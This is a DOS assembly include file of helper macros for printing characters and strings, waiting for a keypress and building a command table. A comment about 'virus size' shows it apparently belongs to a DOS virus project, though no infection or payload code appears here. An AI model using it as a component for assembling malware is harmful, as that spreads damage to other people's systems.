wptr    equ     word ptr
bptr    equ     byte ptr
ofs     equ     offset
eol     equ     13,10,'$'
vs      equ     dataend-s               ; virus size w/o code.inc & host.inc

prnchr  macro   chr                     ; print a char
        push    ax dx
        mov     ah,2
        mov     dl,chr
        int     21h
        pop     dx ax
        endm

prnstr  macro   msg                     ; print an ASCII string
        push    ax dx
        push    ds
        push    cs
        pop     ds
        mov     ah,9
        lea     dx,msg
        int     21h
        pop     ds
        pop     dx ax
        endm

prnaz   macro   _ofs                    ; print an ASCIIZ string
local   @0, @1                          ; in ds:dx or ds:_ofs if defined
        cld
        push    ax si
IFB     <_ofs>
        mov     si,dx
ELSE
        mov     si,_ofs
ENDIF
@0:
        lodsb
        test    al,al
        jz      short @1
        int     29h
        jmp     short @0
@1:
        pop     si ax
        endm

sleep   macro
        push    ax
        xor     ax,ax
        int     16h
        pop     ax
        endm


; the following macros - for making cmdlist

i       macro   x1,x2
        dw      x1
        db      x2-x1
        endm

        mcnt1   =       1
        mcnt2   =       2
icmd    macro   cnt1, cnt2
        dw      @m&cnt1
        db      @m&cnt2 - @m&cnt1
        endm

cmd     macro   cnt
        rept    cnt
        icmd    %mcnt1, %mcnt2
        mcnt1   =       mcnt1 + 1
        mcnt2   =       mcnt2 + 1
        endm
        endm

